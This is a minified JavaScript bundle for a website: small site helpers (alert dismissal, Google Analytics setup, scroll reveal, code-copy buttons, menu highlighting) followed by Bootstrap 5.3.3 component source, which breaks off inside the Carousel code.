/*!
  * Bootstrap v5.3.3 (https://getbootstrap.com/)
  * Copyright 2011-2024 The Bootstrap Authors (https://github.com/twbs/bootstrap/graphs/contributors)
  * Licensed under MIT (https://github.com/twbs/bootstrap/blob/main/LICENSE)
  */const alert=document.getElementById("page-alert"),closeBtn=document.getElementById("page-alert-btn-close");if(alert!==null&&closeBtn!==null){const version=alert.getAttribute("data-page-alert-version")||"unknown",hideAlert=sessionStorage.getItem(`page-alert-${version}`)!==null;hideAlert&&alert.classList.add("d-none"),closeBtn.addEventListener("click",()=>{sessionStorage.setItem(`page-alert-${version}`,"seen"),alert.classList.add("d-none")})}var doNotTrack=!1;if(!1)var dnt=navigator.doNotTrack||window.doNotTrack||navigator.msDoNotTrack,doNotTrack=dnt=="1"||dnt=="yes";if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-HCTHDQERH9")}function reveal(){const reveals=document.querySelectorAll(".reveal");for(let i=0;i<reveals.length;i++){const windowHeight=window.innerHeight,elementTop=reveals[i].getBoundingClientRect().top,elementVisible=150;elementTop<windowHeight-elementVisible?(reveals[i].classList.add("active"),reveals[i].classList.remove("reveal")):reveals[i].classList.remove("active")}}window.addEventListener("scroll",reveal);const svgCopy='<svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" width="16" height="16" fill="currentColor" class="bi bi-clipboard" viewBox="0 0 16 16"><path d="M4 1.5H3a2 2 0 0 0-2 2V14a2 2 0 0 0 2 2h10a2 2 0 0 0 2-2V3.5a2 2 0 0 0-2-2h-1v1h1a1 1 0 0 1 1 1V14a1 1 0 0 1-1 1H3a1 1 0 0 1-1-1V3.5a1 1 0 0 1 1-1h1v-1z"/><path d="M9.5 1a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-3a.5.5 0 0 1-.5-.5v-1a.5.5 0 0 1 .5-.5h3zm-3-1A1.5 1.5 0 0 0 5 1.5v1A1.5 1.5 0 0 0 6.5 4h3A1.5 1.5 0 0 0 11 2.5v-1A1.5 1.5 0 0 0 9.5 0h-3z"/></svg>',svgCheck='<svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true"><path fill-rule="evenodd" fill="rgb(63, 185, 80)" d="M13.78 4.22a.75.75 0 010 1.06l-7.25 7.25a.75.75 0 01-1.06 0L2.22 9.28a.75.75 0 011.06-1.06L6 10.94l6.72-6.72a.75.75 0 011.06 0z"></path></svg>',addCopyButtons=clipboard=>{document.querySelectorAll("pre > code").forEach(codeBlock=>{const button=document.createElement("button");button.className="clipboard-button",button.setAttribute("data-toast-target","toast-copied-code-message"),button.setAttribute("aria-label","copy to clipboard"),button.type="button",button.innerHTML=svgCopy,button.addEventListener("click",()=>{const text=codeBlock.innerText.split(`
`).filter(Boolean).join(`
`);clipboard.writeText(text).then(()=>{button.blur(),button.innerHTML=svgCheck,setTimeout(()=>button.innerHTML=svgCopy,2e3)},error=>button.innerHTML="Error")});const pre=codeBlock.parentNode;pre.parentNode.insertBefore(button,pre)})};navigator&&navigator.clipboard&&addCopyButtons(navigator.clipboard),document.querySelectorAll("[data-clipboard]").forEach(trigger=>{const text=trigger.getAttribute("data-clipboard");trigger.addEventListener("click",()=>{navigator.clipboard.writeText(text)})});const url=new URL(window.location.href),menu=url.searchParams.get("menu"),child=url.searchParams.get("child"),menuItems=document.querySelectorAll('[data-nav="main"]');if(menu!==null){menuItems.forEach(element=>{element.classList.remove("active")});const targetMainItems=document.querySelectorAll(`[data-nav-main="${menu}"]:not([data-nav-child])`);targetMainItems.forEach(element=>{element.classList.add("active")});const targetChildItems=document.querySelectorAll(`[data-nav-main="${menu}"][data-nav-child="${child}"]`);targetChildItems.forEach(element=>{element.classList.add("active")})}(function(global,factory){typeof exports=="object"&&typeof module!="undefined"?module.exports=factory():typeof define=="function"&&define.amd?define(factory):(global=typeof globalThis!="undefined"?globalThis:global||self,global.bootstrap=factory())})(this,function(){"use strict";const elementMap=new Map,Data={set(element,key,instance){elementMap.has(element)||elementMap.set(element,new Map);const instanceMap=elementMap.get(element);if(!instanceMap.has(key)&&instanceMap.size!==0){console.error(`Bootstrap doesn't allow more than one instance per element. Bound instance: ${Array.from(instanceMap.keys())[0]}.`);return}instanceMap.set(key,instance)},get(element,key){return elementMap.has(element)?elementMap.get(element).get(key)||null:null},remove(element,key){if(!elementMap.has(element))return;const instanceMap=elementMap.get(element);instanceMap.delete(key),instanceMap.size===0&&elementMap.delete(element)}},MAX_UID=1e6,MILLISECONDS_MULTIPLIER=1e3,TRANSITION_END="transitionend",parseSelector=selector=>(selector&&window.CSS&&window.CSS.escape&&(selector=selector.replace(/#([^\s"#']+)/g,(match,id)=>`#${CSS.escape(id)}`)),selector),toType=object=>object==null?`${object}`:Object.prototype.toString.call(object).match(/\s([a-z]+)/i)[1].toLowerCase(),getUID=prefix=>{do prefix+=Math.floor(Math.random()*MAX_UID);while(document.getElementById(prefix))return prefix},getTransitionDurationFromElement=element=>{if(!element)return 0;let{transitionDuration,transitionDelay}=window.getComputedStyle(element);const floatTransitionDuration=Number.parseFloat(transitionDuration),floatTransitionDelay=Number.parseFloat(transitionDelay);return!floatTransitionDuration&&!floatTransitionDelay?0:(transitionDuration=transitionDuration.split(",")[0],transitionDelay=transitionDelay.split(",")[0],(Number.parseFloat(transitionDuration)+Number.parseFloat(transitionDelay))*MILLISECONDS_MULTIPLIER)},triggerTransitionEnd=element=>{element.dispatchEvent(new Event(TRANSITION_END))},isElement$1=object=>!!object&&typeof object=="object"&&(typeof object.jquery!="undefined"&&(object=object[0]),typeof object.nodeType!="undefined"),getElement=object=>isElement$1(object)?object.jquery?object[0]:object:typeof object=="string"&&object.length>0?document.querySelector(parseSelector(object)):null,isVisible=element=>{if(!isElement$1(element)||element.getClientRects().length===0)return!1;const elementIsVisible=getComputedStyle(element).getPropertyValue("visibility")==="visible",closedDetails=element.closest("details:not([open])");if(!closedDetails)return elementIsVisible;if(closedDetails!==element){const summary=element.closest("summary");if(summary&&summary.parentNode!==closedDetails)return!1;if(summary===null)return!1}return elementIsVisible},isDisabled=element=>!element||element.nodeType!==Node.ELEMENT_NODE||!!element.classList.contains("disabled")||(typeof element.disabled!="undefined"?element.disabled:element.hasAttribute("disabled")&&element.getAttribute("disabled")!=="false"),findShadowRoot=element=>{if(!document.documentElement.attachShadow)return null;if(typeof element.getRootNode=="function"){const root=element.getRootNode();return root instanceof ShadowRoot?root:null}return element instanceof ShadowRoot?element:element.parentNode?findShadowRoot(element.parentNode):null},noop=()=>{},reflow=element=>{element.offsetHeight},getjQuery=()=>window.jQuery&&!document.body.hasAttribute("data-bs-no-jquery")?window.jQuery:null,DOMContentLoadedCallbacks=[],onDOMContentLoaded=callback=>{document.readyState==="loading"?(DOMContentLoadedCallbacks.length||document.addEventListener("DOMContentLoaded",()=>{for(const callback of DOMContentLoadedCallbacks)callback()}),DOMContentLoadedCallbacks.push(callback)):callback()},isRTL=()=>document.documentElement.dir==="rtl",defineJQueryPlugin=plugin=>{onDOMContentLoaded(()=>{const $=getjQuery();if($){const name=plugin.NAME,JQUERY_NO_CONFLICT=$.fn[name];$.fn[name]=plugin.jQueryInterface,$.fn[name].Constructor=plugin,$.fn[name].noConflict=()=>($.fn[name]=JQUERY_NO_CONFLICT,plugin.jQueryInterface)}})},execute=(possibleCallback,args=[],defaultValue=possibleCallback)=>typeof possibleCallback=="function"?possibleCallback(...args):defaultValue,executeAfterTransition=(callback,transitionElement,waitForTransition=!0)=>{if(!waitForTransition){execute(callback);return}const durationPadding=5,emulatedDuration=getTransitionDurationFromElement(transitionElement)+durationPadding;let called=!1;const handler=({target})=>{if(target!==transitionElement)return;called=!0,transitionElement.removeEventListener(TRANSITION_END,handler),execute(callback)};transitionElement.addEventListener(TRANSITION_END,handler),setTimeout(()=>{called||triggerTransitionEnd(transitionElement)},emulatedDuration)},getNextActiveElement=(list,activeElement,shouldGetNext,isCycleAllowed)=>{const listLength=list.length;let index=list.indexOf(activeElement);return index===-1?!shouldGetNext&&isCycleAllowed?list[listLength-1]:list[0]:(index+=shouldGetNext?1:-1,isCycleAllowed&&(index=(index+listLength)%listLength),list[Math.max(0,Math.min(index,listLength-1))])},namespaceRegex=/[^.]*(?=\..*)\.|.*/,stripNameRegex=/\..*/,stripUidRegex=/::\d+$/,eventRegistry={};let uidEvent=1;const customEvents={mouseenter:"mouseover",mouseleave:"mouseout"},nativeEvents=new Set(["click","dblclick","mouseup","mousedown","contextmenu","mousewheel","DOMMouseScroll","mouseover","mouseout","mousemove","selectstart","selectend","keydown","keypress","keyup","orientationchange","touchstart","touchmove","touchend","touchcancel","pointerdown","pointermove","pointerup","pointerleave","pointercancel","gesturestart","gesturechange","gestureend","focus","blur","change","reset","select","submit","focusin","focusout","load","unload","beforeunload","resize","move","DOMContentLoaded","readystatechange","error","abort","scroll"]);function makeEventUid(element,uid){return uid&&`${uid}::${uidEvent++}`||element.uidEvent||uidEvent++}function getElementEvents(element){const uid=makeEventUid(element);return element.uidEvent=uid,eventRegistry[uid]=eventRegistry[uid]||{},eventRegistry[uid]}function bootstrapHandler(element,fn){return function handler(event){return hydrateObj(event,{delegateTarget:element}),handler.oneOff&&EventHandler.off(element,event.type,fn),fn.apply(element,[event])}}function bootstrapDelegationHandler(element,selector,fn){return function handler(event){const domElements=element.querySelectorAll(selector);for(let{target}=event;target&&target!==this;target=target.parentNode)for(const domElement of domElements){if(domElement!==target)continue;return hydrateObj(event,{delegateTarget:target}),handler.oneOff&&EventHandler.off(element,event.type,selector,fn),fn.apply(target,[event])}}}function findHandler(events,callable,delegationSelector=null){return Object.values(events).find(event=>event.callable===callable&&event.delegationSelector===delegationSelector)}function normalizeParameters(originalTypeEvent,handler,delegationFunction){const isDelegated=typeof handler=="string",callable=isDelegated?delegationFunction:handler||delegationFunction;let typeEvent=getTypeEvent(originalTypeEvent);return nativeEvents.has(typeEvent)||(typeEvent=originalTypeEvent),[isDelegated,callable,typeEvent]}function addHandler(element,originalTypeEvent,handler,delegationFunction,oneOff){if(typeof originalTypeEvent!="string"||!element)return;let[isDelegated,callable,typeEvent]=normalizeParameters(originalTypeEvent,handler,delegationFunction);if(originalTypeEvent in customEvents){const wrapFunction=fn=>function(event){if(!event.relatedTarget||event.relatedTarget!==event.delegateTarget&&!event.delegateTarget.contains(event.relatedTarget))return fn.call(this,event)};callable=wrapFunction(callable)}const events=getElementEvents(element),handlers=events[typeEvent]||(events[typeEvent]={}),previousFunction=findHandler(handlers,callable,isDelegated?handler:null);if(previousFunction){previousFunction.oneOff=previousFunction.oneOff&&oneOff;return}const uid=makeEventUid(callable,originalTypeEvent.replace(namespaceRegex,"")),fn=isDelegated?bootstrapDelegationHandler(element,handler,callable):bootstrapHandler(element,callable);fn.delegationSelector=isDelegated?handler:null,fn.callable=callable,fn.oneOff=oneOff,fn.uidEvent=uid,handlers[uid]=fn,element.addEventListener(typeEvent,fn,isDelegated)}function removeHandler(element,events,typeEvent,handler,delegationSelector){const fn=findHandler(events[typeEvent],handler,delegationSelector);if(!fn)return;element.removeEventListener(typeEvent,fn,Boolean(delegationSelector)),delete events[typeEvent][fn.uidEvent]}function removeNamespacedHandlers(element,events,typeEvent,namespace){const storeElementEvent=events[typeEvent]||{};for(const[handlerKey,event]of Object.entries(storeElementEvent))handlerKey.includes(namespace)&&removeHandler(element,events,typeEvent,event.callable,event.delegationSelector)}function getTypeEvent(event){return event=event.replace(stripNameRegex,""),customEvents[event]||event}const EventHandler={on(element,event,handler,delegationFunction){addHandler(element,event,handler,delegationFunction,!1)},one(element,event,handler,delegationFunction){addHandler(element,event,handler,delegationFunction,!0)},off(element,originalTypeEvent,handler,delegationFunction){if(typeof originalTypeEvent!="string"||!element)return;const[isDelegated,callable,typeEvent]=normalizeParameters(originalTypeEvent,handler,delegationFunction),inNamespace=typeEvent!==originalTypeEvent,events=getElementEvents(element),storeElementEvent=events[typeEvent]||{},isNamespace=originalTypeEvent.startsWith(".");if(typeof callable!="undefined"){if(!Object.keys(storeElementEvent).length)return;removeHandler(element,events,typeEvent,callable,isDelegated?handler:null);return}if(isNamespace)for(const elementEvent of Object.keys(events))removeNamespacedHandlers(element,events,elementEvent,originalTypeEvent.slice(1));for(const[keyHandlers,event]of Object.entries(storeElementEvent)){const handlerKey=keyHandlers.replace(stripUidRegex,"");(!inNamespace||originalTypeEvent.includes(handlerKey))&&removeHandler(element,events,typeEvent,event.callable,event.delegationSelector)}},trigger(element,event,args){if(typeof event!="string"||!element)return null;const $=getjQuery(),typeEvent=getTypeEvent(event),inNamespace=event!==typeEvent;let jQueryEvent=null,bubbles=!0,nativeDispatch=!0,defaultPrevented=!1;inNamespace&&$&&(jQueryEvent=$.Event(event,args),$(element).trigger(jQueryEvent),bubbles=!jQueryEvent.isPropagationStopped(),nativeDispatch=!jQueryEvent.isImmediatePropagationStopped(),defaultPrevented=jQueryEvent.isDefaultPrevented());const evt=hydrateObj(new Event(event,{bubbles,cancelable:!0}),args);return defaultPrevented&&evt.preventDefault(),nativeDispatch&&element.dispatchEvent(evt),evt.defaultPrevented&&jQueryEvent&&jQueryEvent.preventDefault(),evt}};function hydrateObj(obj,meta={}){for(const[key,value]of Object.entries(meta))try{obj[key]=value}catch{Object.defineProperty(obj,key,{configurable:!0,get(){return value}})}return obj}function normalizeData(value){if(value==="true")return!0;if(value==="false")return!1;if(value===Number(value).toString())return Number(value);if(value===""||value==="null")return null;if(typeof value!="string")return value;try{return JSON.parse(decodeURIComponent(value))}catch{return value}}function normalizeDataKey(key){return key.replace(/[A-Z]/g,chr=>`-${chr.toLowerCase()}`)}const Manipulator={setDataAttribute(element,key,value){element.setAttribute(`data-bs-${normalizeDataKey(key)}`,value)},removeDataAttribute(element,key){element.removeAttribute(`data-bs-${normalizeDataKey(key)}`)},getDataAttributes(element){if(!element)return{};const attributes={},bsKeys=Object.keys(element.dataset).filter(key=>key.startsWith("bs")&&!key.startsWith("bsConfig"));for(const key of bsKeys){let pureKey=key.replace(/^bs/,"");pureKey=pureKey.charAt(0).toLowerCase()+pureKey.slice(1,pureKey.length),attributes[pureKey]=normalizeData(element.dataset[key])}return attributes},getDataAttribute(element,key){return normalizeData(element.getAttribute(`data-bs-${normalizeDataKey(key)}`))}};class Config{static get Default(){return{}}static get DefaultType(){return{}}static get NAME(){throw new Error('You have to implement the static method "NAME", for each component!')}_getConfig(config){return config=this._mergeConfigObj(config),config=this._configAfterMerge(config),this._typeCheckConfig(config),config}_configAfterMerge(config){return config}_mergeConfigObj(config,element){const jsonConfig=isElement$1(element)?Manipulator.getDataAttribute(element,"config"):{};return{...this.constructor.Default,...typeof jsonConfig=="object"?jsonConfig:{},...isElement$1(element)?Manipulator.getDataAttributes(element):{},...typeof config=="object"?config:{}}}_typeCheckConfig(config,configTypes=this.constructor.DefaultType){for(const[property,expectedTypes]of Object.entries(configTypes)){const value=config[property],valueType=isElement$1(value)?"element":toType(value);if(!new RegExp(expectedTypes).test(valueType))throw new TypeError(`${this.constructor.NAME.toUpperCase()}: Option "${property}" provided type "${valueType}" but expected type "${expectedTypes}".`)}}}const VERSION="5.3.3";class BaseComponent extends Config{constructor(element,config){if(super(),element=getElement(element),!element)return;this._element=element,this._config=this._getConfig(config),Data.set(this._element,this.constructor.DATA_KEY,this)}dispose(){Data.remove(this._element,this.constructor.DATA_KEY),EventHandler.off(this._element,this.constructor.EVENT_KEY);for(const propertyName of Object.getOwnPropertyNames(this))this[propertyName]=null}_queueCallback(callback,element,isAnimated=!0){executeAfterTransition(callback,element,isAnimated)}_getConfig(config){return config=this._mergeConfigObj(config,this._element),config=this._configAfterMerge(config),this._typeCheckConfig(config),config}static getInstance(element){return Data.get(getElement(element),this.DATA_KEY)}static getOrCreateInstance(element,config={}){return this.getInstance(element)||new this(element,typeof config=="object"?config:null)}static get VERSION(){return VERSION}static get DATA_KEY(){return`bs.${this.NAME}`}static get EVENT_KEY(){return`.${this.DATA_KEY}`}static eventName(name){return`${name}${this.EVENT_KEY}`}}const getSelector=element=>{let selector=element.getAttribute("data-bs-target");if(!selector||selector==="#"){let hrefAttribute=element.getAttribute("href");if(!hrefAttribute||!hrefAttribute.includes("#")&&!hrefAttribute.startsWith("."))return null;hrefAttribute.includes("#")&&!hrefAttribute.startsWith("#")&&(hrefAttribute=`#${hrefAttribute.split("#")[1]}`),selector=hrefAttribute&&hrefAttribute!=="#"?hrefAttribute.trim():null}return selector?selector.split(",").map(sel=>parseSelector(sel)).join(","):null},SelectorEngine={find(selector,element=document.documentElement){return[].concat(...Element.prototype.querySelectorAll.call(element,selector))},findOne(selector,element=document.documentElement){return Element.prototype.querySelector.call(element,selector)},children(element,selector){return[].concat(...element.children).filter(child=>child.matches(selector))},parents(element,selector){const parents=[];let ancestor=element.parentNode.closest(selector);for(;ancestor;)parents.push(ancestor),ancestor=ancestor.parentNode.closest(selector);return parents},prev(element,selector){let previous=element.previousElementSibling;for(;previous;){if(previous.matches(selector))return[previous];previous=previous.previousElementSibling}return[]},next(element,selector){let next=element.nextElementSibling;for(;next;){if(next.matches(selector))return[next];next=next.nextElementSibling}return[]},focusableChildren(element){const focusables=["a","button","input","textarea","select","details","[tabindex]",'[contenteditable="true"]'].map(selector=>`${selector}:not([tabindex^="-"])`).join(",");return this.find(focusables,element).filter(el=>!isDisabled(el)&&isVisible(el))},getSelectorFromElement(element){const selector=getSelector(element);return selector?SelectorEngine.findOne(selector)?selector:null:null},getElementFromSelector(element){const selector=getSelector(element);return selector?SelectorEngine.findOne(selector):null},getMultipleElementsFromSelector(element){const selector=getSelector(element);return selector?SelectorEngine.find(selector):[]}},enableDismissTrigger=(component,method="hide")=>{const clickEvent=`click.dismiss${component.EVENT_KEY}`,name=component.NAME;EventHandler.on(document,clickEvent,`[data-bs-dismiss="${name}"]`,function(event){if(["A","AREA"].includes(this.tagName)&&event.preventDefault(),isDisabled(this))return;const target=SelectorEngine.getElementFromSelector(this)||this.closest(`.${name}`),instance=component.getOrCreateInstance(target);instance[method]()})},NAME$f="alert",DATA_KEY$a="bs.alert",EVENT_KEY$b=`.${DATA_KEY$a}`,EVENT_CLOSE=`close${EVENT_KEY$b}`,EVENT_CLOSED=`closed${EVENT_KEY$b}`,CLASS_NAME_FADE$5="fade",CLASS_NAME_SHOW$8="show";class Alert extends BaseComponent{static get NAME(){return NAME$f}close(){const closeEvent=EventHandler.trigger(this._element,EVENT_CLOSE);if(closeEvent.defaultPrevented)return;this._element.classList.remove(CLASS_NAME_SHOW$8);const isAnimated=this._element.classList.contains(CLASS_NAME_FADE$5);this._queueCallback(()=>this._destroyElement(),this._element,isAnimated)}_destroyElement(){this._element.remove(),EventHandler.trigger(this._element,EVENT_CLOSED),this.dispose()}static jQueryInterface(config){return this.each(function(){const data=Alert.getOrCreateInstance(this);if(typeof config!="string")return;if(data[config]===void 0||config.startsWith("_")||config==="constructor")throw new TypeError(`No method named "${config}"`);data[config](this)})}}enableDismissTrigger(Alert,"close"),defineJQueryPlugin(Alert);const NAME$e="button",DATA_KEY$9="bs.button",EVENT_KEY$a=`.${DATA_KEY$9}`,DATA_API_KEY$6=".data-api",CLASS_NAME_ACTIVE$3="active",SELECTOR_DATA_TOGGLE$5='[data-bs-toggle="button"]',EVENT_CLICK_DATA_API$6=`click${EVENT_KEY$a}${DATA_API_KEY$6}`;class Button extends BaseComponent{static get NAME(){return NAME$e}toggle(){this._element.setAttribute("aria-pressed",this._element.classList.toggle(CLASS_NAME_ACTIVE$3))}static jQueryInterface(config){return this.each(function(){const data=Button.getOrCreateInstance(this);config==="toggle"&&data[config]()})}}EventHandler.on(document,EVENT_CLICK_DATA_API$6,SELECTOR_DATA_TOGGLE$5,event=>{event.preventDefault();const button=event.target.closest(SELECTOR_DATA_TOGGLE$5),data=Button.getOrCreateInstance(button);data.toggle()}),defineJQueryPlugin(Button);const NAME$d="swipe",EVENT_KEY$9=".bs.swipe",EVENT_TOUCHSTART=`touchstart${EVENT_KEY$9}`,EVENT_TOUCHMOVE=`touchmove${EVENT_KEY$9}`,EVENT_TOUCHEND=`touchend${EVENT_KEY$9}`,EVENT_POINTERDOWN=`pointerdown${EVENT_KEY$9}`,EVENT_POINTERUP=`pointerup${EVENT_KEY$9}`,POINTER_TYPE_TOUCH="touch",POINTER_TYPE_PEN="pen",CLASS_NAME_POINTER_EVENT="pointer-event",SWIPE_THRESHOLD=40,Default$c={endCallback:null,leftCallback:null,rightCallback:null},DefaultType$c={endCallback:"(function|null)",leftCallback:"(function|null)",rightCallback:"(function|null)"};class Swipe extends Config{constructor(element,config){if(super(),this._element=element,!element||!Swipe.isSupported())return;this._config=this._getConfig(config),this._deltaX=0,this._supportPointerEvents=Boolean(window.PointerEvent),this._initEvents()}static get Default(){return Default$c}static get DefaultType(){return DefaultType$c}static get NAME(){return NAME$d}dispose(){EventHandler.off(this._element,EVENT_KEY$9)}_start(event){if(!this._supportPointerEvents){this._deltaX=event.touches[0].clientX;return}this._eventIsPointerPenTouch(event)&&(this._deltaX=event.clientX)}_end(event){this._eventIsPointerPenTouch(event)&&(this._deltaX=event.clientX-this._deltaX),this._handleSwipe(),execute(this._config.endCallback)}_move(event){this._deltaX=event.touches&&event.touches.length>1?0:event.touches[0].clientX-this._deltaX}_handleSwipe(){const absDeltaX=Math.abs(this._deltaX);if(absDeltaX<=SWIPE_THRESHOLD)return;const direction=absDeltaX/this._deltaX;if(this._deltaX=0,!direction)return;execute(direction>0?this._config.rightCallback:this._config.leftCallback)}_initEvents(){this._supportPointerEvents?(EventHandler.on(this._element,EVENT_POINTERDOWN,event=>this._start(event)),EventHandler.on(this._element,EVENT_POINTERUP,event=>this._end(event)),this._element.classList.add(CLASS_NAME_POINTER_EVENT)):(EventHandler.on(this._element,EVENT_TOUCHSTART,event=>this._start(event)),EventHandler.on(this._element,EVENT_TOUCHMOVE,event=>this._move(event)),EventHandler.on(this._element,EVENT_TOUCHEND,event=>this._end(event)))}_eventIsPointerPenTouch(event){return this._supportPointerEvents&&(event.pointerType===POINTER_TYPE_PEN||event.pointerType===POINTER_TYPE_TOUCH)}static isSupported(){return"ontouchstart"in document.documentElement||navigator.maxTouchPoints>0}}const NAME$c="carousel",DATA_KEY$8="bs.carousel",EVENT_KEY$8=`.${DATA_KEY$8}`,DATA_API_KEY$5=".data-api",ARROW_LEFT_KEY$1="ArrowLeft",ARROW_RIGHT_KEY$1="ArrowRight",TOUCHEVENT_COMPAT_WAIT=500,ORDER_NEXT="next",ORDER_PREV="prev",DIRECTION_LEFT="left",DIRECTION_RIGHT="right",EVENT_SLIDE=`slide${EVENT_KEY$8}`,EVENT_SLID=`slid${EVENT_KEY$8}`,EVENT_KEYDOWN$1=`keydown${EVENT_KEY$8}`,EVENT_MOUSEENTER$1=`mouseenter${EVENT_KEY$8}`,EVENT_MOUSELEAVE$1=`mouseleave${EVENT_KEY$8}`,EVENT_DRAG_START=`dragstart${EVENT_KEY$8}`,EVENT_LOAD_DATA_API$3=`load${EVENT_KEY$8}${DATA_API_KEY$5}`,EVENT_CLICK_DATA_API$5=`click${EVENT_KEY$8}${DATA_API_KEY$5}`,CLASS_NAME_CAROUSEL="carousel",CLASS_NAME_ACTIVE$2="active",CLASS_NAME_SLIDE="slide",CLASS_NAME_END="carousel-item-end",CLASS_NAME_START="carousel-item-start",CLASS_NAME_NEXT="carousel-item-next",CLASS_NAME_PREV="carousel-item-prev",SELECTOR_ACTIVE=".active",SELECTOR_ITEM=".carousel-item",SELECTOR_ACTIVE_ITEM=SELECTOR_ACTIVE+SELECTOR_ITEM,SELECTOR_ITEM_IMG=".carousel-item img",SELECTOR_INDICATORS=".carousel-indicators",SELECTOR_DATA_SLIDE="[data-bs-slide], [data-bs-slide-to]",SELECTOR_DATA_RIDE='[data-bs-ride="carousel"]',KEY_TO_DIRECTION={[ARROW_LEFT_KEY$1]:DIRECTION_RIGHT,[ARROW_RIGHT_KEY$1]:DIRECTION_LEFT},Default$b={interval:5e3,keyboard:!0,pause:"hover",ride:!1,touch:!0,wrap:!0},DefaultType$b={interval:"(number|boolean)",keyboard:"boolean",pause:"(string|boolean)",ride:"(boolean|string)",touch:"boolean",wrap:"boolean"};class Carousel extends BaseComponent{constructor(element,config){super(element,config),this._interval=null,this._activeElement=null,this._isSliding=!1,this.touchTimeout=null,this._swipeHelper=null,this._indicatorsElement=SelectorEngine.findOne(SELECTOR_INDICATORS,this._element),this._addEventListeners(),this._config.ride===CLASS_NAME_CAROUSEL&&this.cycle()}static get Default(){return Default$b}static get DefaultType(){return DefaultType$b}static get NAME(){return NAME$c}next(){this._slide(ORDER_NEXT)}nextWhenVisible(){!document.hidden&&isVisible(this._element)&&this.next()}prev(){this._slide(ORDER_PREV)}pause(){this._isSliding&&triggerTransitionEnd(this._element),this._clearInterval()}cycle(){this._clearInterval(),this._updateInterval(),this._interval=setInterval(()=>this.nextWhenVisible(),this._config.interval)}_maybeEnableCycle(){if(!this._config.ride)return;if(this._isSliding){EventHandler.one(this._element,EVENT_SLID,()=>this.cycle());return}this.cycle()}to(index){const items=this._getItems();if(index>items.length-1||index<0)return;if(this._isSliding){EventHandler.one(this._element,EVENT_SLID,()=>this.to(index));return}const activeIndex=this._getItemIndex(this._getActive());if(activeIndex===index)return;const order=index>activeIndex?ORDER_NEXT:ORDER_PREV;this._slide(order,items[index])}dispose(){this._swipeHelper&&this._swipeHelper.dispose(),super.dispose()}_configAfterMerge(config){return config.defaultInterval=config.interval,config}_addEventListeners(){this._config.keyboard&&EventHandler.on(this._element,EVENT_KEYDOWN$1,event=>this._keydown(event)),this._config.pause==="hover"&&(EventHandler.on(this._element,EVENT_MOUSEENTER$1,()=>this.pause()),EventHandler.on(this._element,EVENT_MOUSELEAVE$1,()=>this._maybeEnableCycle())),this._config.touch&&Swipe.isSupported()&&this._addTouchEventListeners()}_addTouchEventListeners(){for(const img of SelectorEngine.find(SELECTOR_ITEM_IMG,this._element))EventHandler.on(img,EVENT_DRAG_START,event=>event.preventDefault());const endCallBack=()=>{if(this._config.pause!=="hover")return;this.pause(),this.touchTimeout&&clearTimeout(this.touchTimeout),this.touchTimeout=setTimeout(()=>this._maybeEnableCycle(),TOUCHEVENT_COMPAT_WAIT+this._config.interval)},swipeConfig={leftCallback:()=>this._slide(this._directionToOrder(DIRECTION_LEFT)),rightCallback:()=>this._slide(this._directionToOrder(DIRECTION_RIGHT)),endCallback:endCallBack};this._swipeHelper=new Swipe(this._element,swipeConfig)}_keydown(event){if(/input|textarea/i.test(event.target.tagName))return;const direction=KEY_TO_DIRECTION[event.key];direction&&(event.preventDefault(),this._slide(this._directionToOrder(direction)))}_getItemIndex(element){return this._getItems().indexOf(element)}_setActiveIndicatorElement(index){if(!this._indicatorsElement)return;const activeIndicator=SelectorEngine.findOne(SELECTOR_ACTIVE,this._indicatorsElement);activeIndicator.classList.remove(CLASS_NAME_ACTIVE$2),activeIndicator.removeAttribute("aria-current");const newActiveIndicator=SelectorEngine.findOne(`[data-bs-slide-to="${index}"]`,this._indicatorsElement);newActiveIndicator&&(newActiveIndicator.classList.add(CLASS_NAME_ACTIVE$2),newActiveIndicator.setAttribute("aria-current","true"))}_updateInterval(){const element=this._activeElement||this._getActive();if(!element)return;const elementInterval=Number.parseInt(element.getAttribute("data-bs-interval"),10);this._config.interval=elementInterval||this._config.defaultInterval}_slide(order,element=null){if(this._isSliding)return;const activeElement=this._getActive(),isNext=order===ORDER_NEXT,nextElement=element||getNextActiveElement(this._getItems(),activeElement,isNext,this._config.wrap);if(nextElement===activeElement)return;const nextElementIndex=this._getItemIndex(nextElement),triggerEvent=eventName=>EventHandler.trigger(this._element,eventName,{relatedTarget:nextElement,direction:this._orderToDirection(order),from:this._getItemIndex(activeElement),to:nextElementIndex}),slideEvent=triggerEvent(EVENT_SLIDE);if(slideEvent.defaultPrevented)return;if(!activeElement||!nextElement)return;const isCycling=Boolean(this._interval);this.pause(),this._isSliding=!0,this._setActiveIndicatorElement(nextElementIndex),this._activeElement=nextElement;const directionalClassName=isNext?CLASS_NAME_START:CLASS_NAME_END,orderClassName=isNext?CLASS_NAME_NEXT:CLASS_NAME_PREV;nextElement.classList.add(orderClassName),reflow(nextElement),activeElement.classList.add(directionalClassName),nextElement.classList.add(directionalClassName);const completeCallBack=()=>{nextElement.classList.remove(directionalClassName,orderClassName),nextElement.classList.add(CLASS_NAME_ACTIVE$2),activeElement.classList.remove(CLASS_NAME_ACTIVE$2,orderClassName,directionalClassName),this._isSliding=!1,triggerEvent(EVENT_SLID)};this._queueCallback(completeCallBack,activeElement,this._isAnimated()),isCycling&&this.cycle()}_isAnimated(){return this._element.classList.contains(CLASS_NAME_SLIDE)}_getActive(){return SelectorEngine.findOne(SELECTOR_ACTIVE_ITEM,this._element)}_getItems(){return SelectorEngine.find(SELECTOR_ITEM,this._element)}_clearInterval(){this._interval&&(clearInterval(this._interval),this._interval=null)}_directionToOrder(direction){return isRTL()?direction===DIRECTION_LEFT?ORDER_PREV:ORDER_NEXT:direction===DIRECTION_LEFT?ORDER_NEXT:ORDER_PREV}_orderToDirection(order){return isRTL()?order===ORDER_PREV?DIRECTION_LEFT:DIRECTION_RIGHT:order===ORDER_PREV?DIRECTION_RIGHT:DIRECTION_LEFT}static jQueryInterface(config){return this.each(function(){const data=Carousel.getOrCreateInstance(this,config);if(typeof config=="number"){data.to(config);return}if(typeof config=="string"){if(data[config]===void 0||config.startsWith("_")||config==="constructor")throw new TypeError(`No method named "${config}"`);data[config]()}})}}EventHandler.on(document,EVENT_CLICK_DATA_API$5,SELECTOR_DATA_SLIDE,function(event){const 